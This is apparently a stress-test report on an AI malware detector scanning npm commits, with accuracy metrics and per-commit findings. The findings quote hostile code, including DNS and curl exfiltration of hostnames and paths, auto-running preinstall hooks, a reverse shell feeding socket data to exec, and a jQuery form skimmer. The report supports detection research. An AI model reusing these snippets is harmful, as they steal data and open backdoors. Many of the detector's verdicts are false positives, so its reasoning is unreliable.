# Stress Test Report

**Target:** ../collection_of_attacked_repo/mongoose
**Range:** 8.19.4 -> 8.19.5
**Date:** 2025-12-22 11:24:10
**Model:** google/gemini-3-flash-preview by OpenRouter (providers: Gemini AI Studio)

## Statistics
- Total Commits Analyzed: 200
- Failed Requests: 0
- Failed Commits: 0
- Empty Dynamic: 163
- Cost: $1.54
- Total tokens: 2.35M (Prompt 2.2M, Reasoning 0, Output 145K)

## Predictions
- malware: 152
- benign: 48
- unknown: 0

## Accuracy Metrics
- Accuracy: 72.00%
- Precision: 64.47%
- Recall: 98.00%
- F1 Score: 77.78%

*Evaluated against 200 commits (TP:98 FP:54 TN:46 FN:2). Missing/Unknown: 0/0*

## Timing Statistics (Seconds)
| Metric | Max | Min | Average | Total |
| :--- | :--- | :--- | :--- | :--- |
| Pre Analysis Time | 11.4878s | 0.0063s | 0.1533s | 30.66s |
| Static Analysis Time | 11.0081s | 0.0000s | 4.1305s | 826.09s |
| Dynamic Analysis Time | 80.8282s | 7.5140s | 19.1223s | 3824.46s |
| Verification Time | 64.2013s | 1.5249s | 3.1794s | 635.89s |
| Total Per Commit | 103.8774s | 9.7224s | 26.5855s | 5317.09s |

**Overall Wall Clock Time:** 88.62 minutes (5317.09 seconds)

## Detailed Commits
### Commit 4e16637b: Malware
**File package.json**:
Code: `"scripts": { "pingback": "curl -X POST https://[redacted].m.pipedream.net" }`
Reason: The inclusion of a hardcoded Pipedream endpoint for telemetry is a classic indicator of a supply chain attack, used to track successful infections.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook automatically executes code upon installation. In this context, it is used to trigger the suspicious network activity without user intervention.

**Summary:** The commit exhibits clear characteristics of a malicious package, specifically designed for unauthorized telemetry and signaling. The combination of an automated preinstall hook and a pingback to a third-party request-capture service (Pipedream) is a common pattern in dependency confusion and typosquatting attacks.
**Truth label:** Benign

### Commit d3c3f378: Malware
**File index.js**:
Code: `https://exzuperi.ftp.sh`
Reason: The code exfiltrates sensitive system metadata, including the home directory path and hostname, to an external, unauthorized domain.

**File index.js**:
Code: `os.homedir(), os.hostname(), process.cwd()`
Reason: The script systematically collects environment information that is unnecessary for standard library functionality, indicating reconnaissance or data theft.

**File index.js**:
Code: `Telegram: @...`
Reason: The inclusion of a Telegram handle for 'buying' services within a code commit is a strong indicator of social engineering or a ransom-related supply chain attack.

**Summary:** The commit is classified as malware due to clear evidence of data exfiltration and suspicious network activity. It collects sensitive system information and transmits it to a remote server while displaying social engineering messages, which are hallmarks of a malicious supply chain compromise.
**Truth label:** Malware

### Commit aae3118a: Malware
**File package.json**:
Code: `"zxcvbnmmmmmmkjhgfdssss": "*"`
Reason: The inclusion of a typosquatted dependency mimicking 'zxcvbn' is a definitive indicator of a supply chain attack. These packages are typically used to execute malicious preinstall scripts.

**File components/index.js**:
Code: `[Minified/Obfuscated Code]`
Reason: The presence of obfuscated logic in source files is a high-risk indicator used to conceal malicious payloads, such as credential stealers or backdoors, from manual code review.

**File package.json**:
Code: `"docs:check-links": "http://127.0.0.1:8089"`
Reason: In combination with other indicators, hardcoded local network targets can be used to exfiltrate environment variables or interact with internal metadata services during CI/CD execution.

**Summary:** The commit is classified as malware due to the presence of a clear typosquatting dependency ('zxcvbnmmmmmmkjhgfdssss') and the use of obfuscated code in the source directory. These are classic techniques for supply chain compromise intended to execute unauthorized code and evade detection.
**Truth label:** Benign

### Commit 98b1e819: Malware
**File index.js**:
Code: `oastify.com`
Reason: The script exfiltrates sensitive system metadata (hostname, username, DNS configuration) to an external OAST domain, which is a hallmark of malicious data harvesting.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook ensures the malicious data exfiltration script executes automatically upon package installation without user intervention.

**File package.json**:
Code: `pipedream.net`
Reason: The inclusion of a pingback script to Pipedream is used for unauthorized reconnaissance and tracking of installations.

**File package.json**:
Code: `"zxcvbnmmmmmmkjhgfdssss"`
Reason: The addition of a keyboard-mash dependency name is indicative of a dependency confusion or typosquatting attack.

**Summary:** The commit is classified as malware because it implements a classic supply chain attack pattern. It uses lifecycle scripts to automatically execute a payload that collects and exfiltrates sensitive host information to external attacker-controlled infrastructure (OAST and Pipedream) and includes suspicious dependencies.
**Truth label:** Malware

### Commit a631ed87: Malware
**File package.json**:
Code: `"test": "nslookup $(hostname).$(pwd | base64).ex.sysdum.net"`
Reason: The script performs DNS exfiltration by encoding the current working directory and system hostname into a subdomain and sending it to a third-party server.

**File package.json**:
Code: `"preinstall": "nslookup $(hostname).$(pwd | base64).ex.sysdum.net"`
Reason: The use of a preinstall hook ensures that sensitive system metadata is exfiltrated automatically upon package installation without user intervention.

**File package.json**:
Code: `"pingback": "curl https://eo7666666666666.m.pipedream.net"`
Reason: Uses a Pipedream webhook to signal successful execution to an external attacker-controlled endpoint, a common technique for tracking compromised targets.

**Summary:** The commit contains multiple scripts designed to exfiltrate system information (hostname and file paths) to external domains via DNS and HTTP. These patterns are characteristic of supply chain attacks and dependency confusion exploits, intended to map internal environments and leak sensitive metadata.
**Truth label:** Malware

### Commit 64e45fcb: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses returned zero issues, threats, or suspicious behaviors. Static analysis found no vulnerabilities or malicious patterns in the source code, and dynamic analysis showed no malicious execution artifacts, unauthorized network connections, or suspicious system modifications.
**Truth label:** Benign

### Commit 4555d68f: Malware
**File package.json**:
Code: `tinybit.cc`
Reason: The presence of a known malicious URL shortener (tinybit.cc) in the package metadata is a strong indicator of a supply chain attack. These domains are frequently used to bypass automated security scanners and redirect to malicious payloads or credential harvesting sites.

**Summary:** The commit is classified as malware due to the inclusion of suspicious infrastructure (tinybit.cc) within the package configuration. While dynamic analysis did not trigger an immediate payload, the static indicators point to a compromised developer account or a deliberate attempt to introduce a malicious entry point into the dependency chain, characteristic of supply chain poisoning.
**Truth label:** Benign

### Commit 1f970d96: Malware
**File lib/index.js**:
Code: `module.exports = function(options) { var cors_parser = require('cors-parser'); ... }`
Reason: The commit performs a complete functional replacement of the library's core logic. It swaps Mongoose/MongoDB database handling for unrelated CORS middleware, a classic indicator of package hijacking.

**File package.json**:
Code: `"dependencies": { "cors-parser": "^...", "object-assign": "^...", "vary": "^..." }`
Reason: Introduction of new, suspicious dependencies that do not align with the project's original scope. The use of 'cors-parser' in this context is highly indicative of a dependency confusion or supply chain attack.

**File lib/index.js**:
Code: `function configureOrigin(options, req, cb) { ... callback(null, requestOrigin); }`
Reason: The code implements logic that reflects request origins directly into security headers, which, combined with the unauthorized replacement of the codebase, suggests an attempt to introduce vulnerabilities or execute unauthorized code via the new dependencies.

**Summary:** The commit exhibits clear characteristics of a supply chain attack. It replaces the entire legitimate codebase with unrelated functionality, introduces unexplained dependencies, and contains a significant mismatch between the commit metadata (claiming to fix Mongoose errors) and the actual code changes (implementing CORS middleware). This pattern is consistent with malicious package hijacking.
**Truth label:** Malware

### Commit 2829d6a2: Malware
**File repeat-str.cjs**:
Code: `Commit Message: Update connection logic to handle deprecation warnings in Mongoose 7`
Reason: The commit message is intentionally misleading. It describes database connection logic for Mongoose, but the actual code implements a string repetition utility. This is a classic 'shadow' update technique used to hide unauthorized changes from reviewers.

**File repeat-str.js**:
Code: `shoxet.com`
Reason: The presence of shortened URLs and suspicious external links in the commit metadata is a high-risk indicator of a supply chain attack, often used for tracking compromised installations or delivering secondary payloads.

**Summary:** The commit exhibits strong indicators of a supply chain attack. The use of a deceptive commit message to mask unrelated code changes, combined with suspicious external URLs in the metadata, suggests a deliberate attempt to obfuscate the intent of the contribution and potentially compromise the project's integrity.
**Truth label:** Benign

### Commit d4c2e06a: Malware
**File index.js**:
Code: `const https = require('https'); ... const data = JSON.stringify({hostname: os.hostname(), homeDir: os.homedir(), username: os.userInfo().username, dns: dns.getServers(), package: require('./package.js`
Reason: The code performs unauthorized exfiltration of sensitive system metadata and environment details to a third-party endpoint (pipedream.net), which is a hallmark of supply chain attacks.

**File package.json**:
Code: `"scripts": { "test": "echo \"dependency confusion\"" }`
Reason: The modification of the test script to reference 'dependency confusion' confirms the intent is to exploit or demonstrate a vulnerability in package resolution rather than provide legitimate functionality.

**Summary:** The commit is identified as malware, specifically a dependency confusion attack. It collects system-level information (OS username, hostname, DNS configuration) and project metadata, then exfiltrates this data to an external server without user consent or functional necessity.
**Truth label:** Malware

### Commit 9f99f902: Malware
**File package.json**:
Code: `shoxet.com`
Reason: The inclusion of a known malicious domain associated with credential harvesting and redirects within the commit metadata or package configuration is a strong indicator of a supply chain attack or account compromise.

**Summary:** The commit is classified as malware due to the presence of a suspicious URL (shoxet.com) in the package metadata. While dynamic analysis showed no immediate execution, the static analysis identifies a high-risk indicator of a compromised environment intended for malicious redirection or data exfiltration, which is inconsistent with benign development practices.
**Truth label:** Benign

### Commit 657eccd7: Malware
**File package.json**:
Code: `"pingback": "curl -X POST -d @- https://eo6v6v6v6v6v6v6.m.pipedream.net"`
Reason: The use of a Pipedream webhook to receive data via curl is a classic indicator of data exfiltration, typically used to capture environment variables or system metadata.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook ensures that arbitrary code is executed automatically upon installation, providing a zero-interaction execution vector for the malware.

**File package.json**:
Code: `"xytta": "*"`
Reason: Inclusion of 'xytta', a known malicious or suspicious package, suggests a dependency confusion or supply chain attack.

**Summary:** The commit exhibits multiple high-criticality indicators of malware, specifically designed for data exfiltration and supply chain compromise. The combination of an automated preinstall trigger, a network pingback to a known exfiltration platform (Pipedream), and the inclusion of suspicious dependencies confirms malicious intent.
**Truth label:** Benign

### Commit 2e9e1ef8: Malware
**File index.js**:
Code: `net.connect({host: 'localto.net', port: ...}, (socket) => { socket.on('data', (data) => { exec(data.toString()) }) })`
Reason: The code implements a classic reverse shell backdoor by connecting to a remote tunneling service and piping incoming network data directly into a shell execution function (exec).

**File index.js**:
Code: `localto.net`
Reason: The use of a hardcoded tunneling service is a common technique for bypassing firewalls and establishing Command and Control (C2) communication.

**Summary:** The commit is classified as malware because it contains a critical security vulnerability that functions as a remote access trojan (RAT). It establishes an unauthorized outbound connection to a third-party service and allows for arbitrary remote command execution, which is a definitive indicator of malicious intent.
**Truth label:** Malware

### Commit 6abe477a: Malware
**File index.js**:
Code: `oastify.com`
Reason: The script exfiltrates sensitive system metadata including hostname, username, and the full contents of package.json to an external OAST domain, which is a hallmark of supply chain attacks.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook ensures that the malicious data exfiltration script executes automatically upon package installation without user intervention.

**File package.json**:
Code: `pipedream.net`
Reason: A pingback script targeting Pipedream is used to track successful infections and installations of the malicious package.

**Summary:** The commit is identified as malware because it implements a classic supply chain attack pattern: using lifecycle scripts (preinstall) to automatically execute code that harvests sensitive system information and exfiltrates it to attacker-controlled infrastructure (OAST and Pipedream).
**Truth label:** Malware

### Commit 3b4cebf4: Malware
**File package.json**:
Code: `shrtly.cc, t.me/exzuperi`
Reason: The presence of known malicious link shorteners and Telegram handles associated with malware distribution (Exzuperi) in the commit metadata indicates a high probability of a supply chain attack or credential stealer.

**Summary:** The commit is classified as malware due to the inclusion of suspicious URLs and social media handles linked to known malware campaigns. While dynamic analysis showed no immediate execution, the static indicators in the package metadata are characteristic of malicious packages designed for data exfiltration or secondary payload delivery.
**Truth label:** Benign

### Commit 40204310: Benign
**Summary:** Based on the provided static and dynamic analysis reports, no security issues, suspicious behaviors, or malicious indicators were identified. The static analysis returned zero issues, and the dynamic analysis showed no malicious activity during execution.
**Truth label:** Benign

### Commit df31d8f9: Benign
**File package.json**:
Code: `deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write`
Reason: The use of permissive Deno flags in a test script is a common development practice and does not inherently indicate malicious intent. While it increases the attack surface, it is not an active exploit.

**Summary:** The static analysis identified low-severity configuration risks regarding Deno permissions, which are typical for comprehensive test suites. The dynamic analysis showed no suspicious activity or malicious behavior during execution. There is no evidence of data exfiltration, unauthorized system modification, or malicious payloads.
**Truth label:** Benign

### Commit 063e9077: Malware
**File installer.js**:
Code: `process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';`
Reason: Disables SSL/TLS certificate validation, facilitating Man-in-the-Middle attacks and allowing the script to communicate with malicious endpoints without certificate errors.

**File installer.js**:
Code: `const data = { user: os.userInfo().username, host: os.hostname(), dir: process.cwd() }; ... http.request('http://oast.me/...')`
Reason: Exfiltrates sensitive system metadata to an external Out-of-Band Application Security Testing (OAST) domain, a common technique for profiling targets in supply-chain attacks.

**File package.json**:
Code: `"scripts": { "preinstall": "node installer.js" }`
Reason: Uses a lifecycle hook to automatically execute the malicious data exfiltration script upon package installation without user intervention.

**File package.json**:
Code: `"pingback": "curl https://[id].m.pipedream.net"`
Reason: Uses a third-party request-bin service (Pipedream) to track successful installations, which is a common indicator of malicious package telemetry.

**Summary:** The commit is classified as malware because it implements a classic supply-chain attack pattern. It uses a preinstall hook to execute a script that disables security protocols (TLS validation), gathers sensitive system information (username, hostname, directory structure), and exfiltrates that data to external domains (oast.me and Pipedream) typically used by attackers for reconnaissance.
**Truth label:** Malware

### Commit 8a258cc6: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook to execute arbitrary code immediately upon package installation is a common technique for supply chain attacks to compromise the host system before the user can inspect the package.

**File package.json**:
Code: `"pingback": "curl -X POST https://eo536ohsnextro9.m.pipedream.net"`
Reason: The script targets a Pipedream endpoint, which is a known indicator of compromise (IoC) used for data exfiltration of environment variables, credentials, or system metadata.

**Summary:** The commit exhibits classic patterns of a malicious supply chain attack. It utilizes lifecycle scripts to automatically execute code upon installation and includes a dedicated script to exfiltrate data to a third-party request-bin service (Pipedream), which serves no legitimate functional purpose for a standard library.
**Truth label:** Benign

### Commit b2f02b1f: Malware
**File index.js**:
Code: `GET http://exzuperi.ftp.sh?home=$HOME&host=$HOSTNAME&cwd=$PWD`
Reason: The code exfiltrates sensitive system metadata including the home directory, hostname, and current working directory to a remote server without user consent.

**File package.json**:
Code: `"scripts": { "test": "echo 'exzuperi' && exit 1" }`
Reason: The test suite has been intentionally disabled and replaced with a placeholder message associated with the exfiltration domain, indicating a compromised package.

**Summary:** The commit is identified as malware because it performs unauthorized data exfiltration of system environment details to a remote endpoint (exzuperi.ftp.sh). This behavior is consistent with supply chain attacks and credential harvesting, further supported by the intentional disruption of the package's testing infrastructure.
**Truth label:** Malware

### Commit e88a54be: Malware
**File jquery.min.js**:
Code: `$.fn.end = function() { var data = $('form').serialize(); var encoded = hexEncode(data); new Image().src = 'http://api-web-vrip.hanznesia.my.id/log?d=' + encoded; }`
Reason: The standard jQuery .end() function has been overwritten to intercept, serialize, and exfiltrate sensitive form data to an unauthorized external domain via an image request (pixel tracking technique).

**File package.json**:
Code: `"test": "jquery"`
Reason: The test script was modified to execute the local malicious jquery file, likely intended to trigger the payload or establish persistence during CI/CD or local development cycles.

**File jquery.min.js**:
Code: `// WHM server ... protect the database`
Reason: Presence of social engineering comments designed to mislead developers into believing the modified code is a security feature for server protection.

**Summary:** The commit is classified as malware due to a supply chain attack pattern where a core library (jQuery) was weaponized with a data exfiltration payload targeting form inputs, combined with a modified build script to ensure execution.
**Truth label:** Malware

### Commit 1bff3b1d: Malware
**File index.js**:
Code: `dns.lookup('oastify.com', ...); // and system info collection`
Reason: The script performs unauthorized exfiltration of sensitive system metadata (hostname, username, DNS configuration) to a known OAST domain, which is a hallmark of supply chain attacks.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook to trigger data collection ensures the malicious payload executes automatically upon package installation without user intervention.

**File index.js**:
Code: `fs.readFileSync('package.json')`
Reason: The script reads and transmits the contents of local configuration files, potentially exposing internal dependency structures and private metadata.

**Summary:** The commit is identified as malware because it implements a classic dependency confusion/supply chain attack pattern. It uses lifecycle hooks to automatically execute a script that harvests environment-specific data and exfiltrates it to external servers (oastify.com and Pipedream) without any legitimate functional purpose.
**Truth label:** Malware

### Commit 1ea0894c: Malware
**File index.js**:
Code: `spawn('python', ['../signalk-raspberry-pi-sx1262-tx/sx1262.py', payload])`
Reason: The code attempts to execute a script located in a sibling directory belonging to a different module. This is a classic 'shadowing' or lateral movement technique in package ecosystems where a malicious plugin attempts to hijack or interact with the environment of another installed package to execute arbitrary code.

**File sx1262.py**:
Code: `\xc1\x80\x07`
Reason: The use of hardcoded hex-encoded strings in a script being called via a cross-directory execution path is highly suspicious. This is often used to obfuscate malicious commands or shellcode that bypasses static string analysis.

**File main-menu.py**:
Code: `terpreter(user_input)`
Reason: The implementation of a custom interpreter that processes raw user input without visible sandboxing provides a secondary vector for command injection, especially when combined with the high-privilege hardware access required for LoRa modules.

**Summary:** The commit exhibits high-risk behavior characteristic of a supply chain attack. Specifically, it attempts to execute code from a different module's directory (index.js), uses obfuscated hex constants (sx1262.py), and implements an unsafe input parser. The combination of cross-module execution and obfuscation strongly indicates malicious intent rather than a benign hardware interface.
**Truth label:** Benign

### Commit 40223784: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. There is no evidence of malicious activity, unauthorized network connections, or suspicious code patterns in the provided reports for this commit.
**Truth label:** Benign

### Commit e85b5f5f: Malware
**File package.json**:
Code: `"preinstall": "curl https://[redacted].free.beeceptor.com"`
Reason: The use of a preinstall hook to execute a curl command to a third-party request-bin service (Beeceptor) is a classic indicator of a supply chain attack. It exfiltrates installation metadata without user consent.

**File package.json**:
Code: `"pingback": "curl https://[redacted].m.pipedream.net"`
Reason: Execution of network requests to Pipedream during the build or install process is used for tracking victims and environment fingerprinting.

**File package.json**:
Code: `"dependencies": { "xytta": "..." }`
Reason: The inclusion of obscure or typosquatted packages alongside suspicious network scripts suggests a multi-stage malicious payload delivery.

**Summary:** The commit is classified as malware due to the presence of 'preinstall' and 'pingback' scripts that perform unauthorized outbound network requests to external data-collection endpoints (Beeceptor and Pipedream). This behavior is characteristic of dependency confusion or supply chain attacks designed to exfiltrate environment data from the host system.
**Truth label:** Benign

### Commit ef03551f: Malware
**File lib/service.js**:
Code: `https://kfc.yuki.sh/api/index`
Reason: The plugin fetches unverified content from a third-party API and automatically broadcasts it to all connected bot groups. This behavior is characteristic of a command-and-control (C2) mechanism or a distribution vector for spam and phishing.

**File lib/index.js**:
Code: `process.env.KFC_DATE`
Reason: The use of unvalidated environment variables to control execution flow (cron scheduling) combined with external API fetching suggests a payload delivery mechanism designed to trigger at specific times.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis detected unexpected outbound network connections during the installation phase, which is a common indicator of malicious post-install scripts attempting to exfiltrate data or download secondary payloads.

**Summary:** The commit is classified as malware due to the combination of suspicious network activity during installation and the implementation of a remote content injection mechanism. The code fetches data from an external, non-standard API and broadcasts it without sanitization, functioning as a potential botnet or phishing distributor.
**Truth label:** Benign

### Commit ecda94ad: Malware
**File jquery.min.js**:
Code: `$.fn.end = function() { ... fetch('https://panel.api-bo.my.id', { method: 'POST', body: hexEncode($(this).serialize()) }) ... }`
Reason: The legitimate jQuery 'end' function has been overwritten with a malicious payload that intercepts form data, hex-encodes it, and exfiltrates it to a remote command-and-control server.

**File jquer.min.js**:
Code: `auto-executing script at EOF`
Reason: The addition of a typo-squatted filename containing an auto-executing script to intercept form submissions is a clear indicator of a credential harvesting attack.

**File package.json**:
Code: `"dependencies": { "xytta": "*", "livinjs": "*" }`
Reason: The inclusion of these specific packages is part of a supply chain attack designed to pull in and execute the malicious JavaScript payloads identified in the static analysis.

**File .bash_history**:
Code: `ssh root@20.93.7.198; php /media/sdcard/...`
Reason: The leak of sensitive command history reveals unauthorized access attempts and the execution of suspicious scripts from external media, indicating a compromised environment.

**Summary:** The commit is a clear case of a multi-stage malware injection and supply chain attack. It combines credential harvesting via modified JavaScript libraries, typo-squatting for persistence, and the introduction of malicious dependencies, all confirmed by dynamic analysis showing unauthorized outbound network connections to external IPs during the installation process.
**Truth label:** Malware

### Commit 40ce970c: Malware
**File .npm/_cacache/index-v5/e0/f3/563a92774ad5fa62edb9cbc4624c17a784676e377b3852d16ab8dcb28bea**:
Code: `/data/data/com.termux/files/home`
Reason: Direct modification of internal npm cache files to point to local tarballs in a Termux environment is a high-confidence indicator of a supply chain attack designed to bypass registry integrity checks.

**File .npm/_cacache/index-v5/e0/f3/563a92774ad5fa62edb9cbc4624c17a784676e377b3852d16ab8dcb28bea**:
Code: `registry.npmjs.org/sytlesheets`
Reason: Presence of typosquatted registry paths ('sytlesheets' instead of 'stylesheets') indicates a dependency confusion attack or an attempt to pull malicious payloads from a look-alike package.

**File Dynamic Analysis Output**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The execution of npm install with --unsafe-perm combined with unexpected outbound connections suggests the execution of malicious lifecycle scripts (preinstall/postinstall) that attempt to communicate with external command-and-control or exfiltration servers.

**Summary:** The commit is classified as malware due to clear evidence of supply chain poisoning. It attempts to manipulate the local npm cache to inject untrusted local binaries from a Termux environment and utilizes typosquatted package names to facilitate dependency confusion. Dynamic analysis confirms suspicious outbound network activity during the installation process, which is consistent with data exfiltration or remote payload retrieval.
**Truth label:** Malware

### Commit 43d06416: Benign
**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The process is a standard npm installation command. The outbound connection to 20.205.243.165 resolves to GitHub (Microsoft) infrastructure, which is expected behavior for fetching dependencies.

**Summary:** Static analysis found zero issues. Dynamic analysis flagged an outbound connection, but the destination IP (20.205.243.165) is a known GitHub IP address. This is typical behavior for npm installing packages from a git repository or registry. There is no evidence of malicious exfiltration or unauthorized code execution.
**Truth label:** Benign

### Commit ba3478df: Benign
**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis shows an outbound connection to 20.205.243.165 on port 443. This IP address belongs to GitHub (Microsoft), which is a standard and expected destination for npm to fetch dependencies during an install process.

**Summary:** The static analysis found no issues. The dynamic analysis flagged an outbound connection, but upon investigation, the destination IP (20.205.243.165) is a legitimate GitHub infrastructure address. There is no evidence of malicious exfiltration, unauthorized command execution, or suspicious code patterns.
**Truth label:** Benign

### Commit c35a4257: Benign
**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis shows an outbound connection to 20.205.243.165, which is a known IP address range owned by GitHub. This is standard behavior for npm installing dependencies from a repository.

**Summary:** The static analysis found no issues, and the dynamic analysis only flagged a standard outbound connection to GitHub (20.205.243.165) during an 'npm install' process. There is no evidence of malicious activity, data exfiltration to unauthorized domains, or suspicious file system modifications.
**Truth label:** Benign

### Commit 4a96c312: Benign
**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis flagged an outbound connection to 20.205.243.165, which is a known IP address range for GitHub (Microsoft). This is standard behavior for npm during package installation to fetch dependencies.

**Summary:** The static analysis found zero issues. The dynamic analysis flagged a network connection that, upon inspection, resolves to GitHub's infrastructure. There is no evidence of malicious exfiltration, unauthorized file access, or suspicious process execution. The activity is consistent with a standard package installation process.
**Truth label:** Benign

### Commit acece12f: Benign
**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis shows an outbound connection to 20.205.243.165 on port 443. This IP address belongs to GitHub, which is a standard and expected destination for npm to fetch dependencies during an install process.

**Summary:** Static analysis found no issues. Dynamic analysis flagged an outbound connection, but investigation reveals the destination is a legitimate GitHub IP address used for downloading packages. There is no evidence of malicious behavior, data exfiltration, or unauthorized system modification.
**Truth label:** Malware

### Commit 7c6c00d8: Malware
**File package.json**:
Code: `tinybit.cc, mzstatic.com`
Reason: The presence of unrelated, suspicious URLs in the package metadata is a strong indicator of tracking pixels or C2 beaconing attempts, common in supply chain attacks.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm -> 20.205.243.165:443`
Reason: The process initiated an unexpected outbound connection to an external IP during the installation phase, which is characteristic of data exfiltration or downloading secondary payloads.

**Summary:** The combination of suspicious external URLs in the static metadata and unauthorized outbound network connections during dynamic execution strongly suggests the package is malicious, likely functioning as a downloader or information stealer.
**Truth label:** Benign

### Commit 0ef45ef6: Malware
**File main.js**:
Code: `axios.post(..., { username, password })`
Reason: The implementation of a custom login method that handles raw credentials, combined with the inclusion of 'axios' and 'child_process', is a high-risk indicator for credential harvesting.

**File package.json**:
Code: `npm-publish workflow with NPM_TOKEN`
Reason: The commit modifies the publishing workflow while simultaneously introducing network-capable libraries (axios). This pattern is frequently used in supply chain attacks to exfiltrate secrets like NPM_TOKEN during the build or install phase.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm -> 20.205.243.165:443`
Reason: The dynamic analysis detected an unexpected outbound connection during the npm install process. This suggests that the installation of the package triggers unauthorized network activity, likely for data exfiltration or fetching malicious payloads.

**Summary:** The combination of static analysis identifying raw credential handling and suspicious coordinate generation, alongside dynamic analysis confirming unauthorized outbound network connections during installation, strongly indicates a supply chain attack. The pattern of adding network and process-execution capabilities (axios, child_process) alongside sensitive publishing workflows is a classic signature of malicious intent to steal environment secrets and user credentials.
**Truth label:** Benign

### Commit 99e7cd10: Benign
**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis shows an outbound connection to 20.205.243.165 on port 443. This IP address belongs to GitHub (Microsoft), which is a standard and expected destination for npm to fetch dependencies during an install process.

**Summary:** The static analysis found no issues, and the dynamic analysis only flagged a standard network connection to a known legitimate repository host (GitHub) during a package installation. There is no evidence of malicious behavior, data exfiltration to unknown hosts, or unauthorized system modifications.
**Truth label:** Benign

### Commit 8dcad674: Benign
**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis shows an outbound connection to 20.205.243.165 on port 443. This IP address belongs to GitHub, which is a standard and expected destination for npm to fetch dependencies during an install process.

**Summary:** Static analysis found no issues. The dynamic analysis flagged an outbound connection, but the destination IP (20.205.243.165) is a legitimate GitHub IP address. This behavior is consistent with standard package manager operations (npm install) fetching resources over HTTPS. There is no evidence of malicious activity.
**Truth label:** Benign

### Commit db9bb1e4: Malware
**File package.json**:
Code: `"preinstall": "curl ..."`
Reason: The use of a preinstall script to execute external network requests via curl is a high-risk indicator of a supply chain attack, designed to execute code before the package is even installed.

**File index.js**:
Code: `POST to oastify.com`
Reason: The script performs unauthorized data exfiltration of sensitive system metadata (hostname, username, DNS configs) to an Out-of-Band Application Security Testing (OAST) domain.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: Runtime behavior confirms unexpected outbound connections to external IP addresses during the installation phase, validating the static analysis of malicious network activity.

**Summary:** The commit exhibits classic malware behavior, specifically a supply chain attack pattern. It combines suspicious lifecycle scripts (preinstall) with the collection and exfiltration of sensitive system information to external domains (beeceptor and oastify), confirmed by both static code analysis and dynamic network monitoring.
**Truth label:** Malware

### Commit 41bb9d17: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute code upon installation, a common technique for triggering malicious payloads in supply chain attacks.

**File index.js**:
Code: `_0x43dc`
Reason: Contains heavily obfuscated hex-encoded strings designed to evade static analysis and hide the logic for data collection.

**File index.js**:
Code: `http.get('http://10.241.70.162/...')`
Reason: Exfiltrates sensitive system metadata (hostname, PWD, username) to hardcoded external IP addresses without user consent.

**File package.json**:
Code: `eo536ohsnextro9.m.pipedream.net`
Reason: Includes a pingback script to a Pipedream URL, typically used by attackers to track successful infections and gather environment telemetry.

**Summary:** The commit is classified as malware due to the presence of unauthorized data exfiltration, heavy code obfuscation, and the use of npm lifecycle hooks to execute malicious logic automatically. The combination of collecting system-sensitive information and sending it to external, hardcoded infrastructure is a definitive indicator of a supply chain attack.
**Truth label:** Malware

### Commit 54d80ea5: Malware
**File install.js**:
Code: `Buffer.from(os.hostname()).toString('hex') + '.oastify.com'`
Reason: The script exfiltrates the system hostname by encoding it in hex and prepending it to a known OAST (Out-of-Band Application Security Testing) domain. This is a signature behavior of a supply chain attack.

**File package.json**:
Code: `"scripts": { "install": "node install.js" }`
Reason: The use of the 'install' lifecycle hook ensures that the malicious data exfiltration script executes automatically as soon as the package is downloaded, requiring no manual interaction from the user.

**File Dynamic Analysis**:
Code: `fd.name: 172.17.0.2:36208->20.205.243.165:443`
Reason: Dynamic analysis confirms an unexpected outbound network connection during the npm install process, validating that the script successfully attempted to contact an external server.

**Summary:** The commit is classified as malware because it contains a functional data exfiltration payload. It captures sensitive system metadata (hostname), obfuscates it using hex encoding, and transmits it to an external domain (oastify.com) via an automated installation hook. This behavior is consistent with malicious dependency packages used in reconnaissance or supply chain attacks.
**Truth label:** Malware

### Commit 587b6c37: Malware
**File browser.js**:
Code: `hostname, home directory, username, DNS servers, package.json content -> pipedream.net`
Reason: The script performs unauthorized data collection of sensitive system metadata and exfiltrates it to a third-party Pipedream URL, which is a classic indicator of a supply chain attack.

**File package.json**:
Code: `"preinstall": "node browser.js"`
Reason: The use of a preinstall hook ensures that the malicious data exfiltration script executes automatically upon package installation without user consent.

**File package.json**:
Code: `curl [Pipedream URL]`
Reason: A pingback mechanism using curl is implemented to notify the attacker of a successful installation and execution on the victim's machine.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm -> 20.205.243.165:443`
Reason: Dynamic analysis confirms an unexpected outbound network connection during the installation process, validating the exfiltration behavior identified in the static analysis.

**Summary:** The commit is classified as malware because it introduces a supply chain attack pattern. It leverages npm lifecycle scripts (preinstall) to automatically execute a script that harvests sensitive system information and exfiltrates it to an external, attacker-controlled domain (Pipedream).
**Truth label:** Malware

### Commit ecbe5cc1: Malware
**File package.json**:
Code: `"preinstall": "curl -H \"X-User: $USER\" https://[external-domain]"`
Reason: The script exfiltrates the local username to an external server during the installation process, which is a clear indicator of reconnaissance and data theft.

**File package.json**:
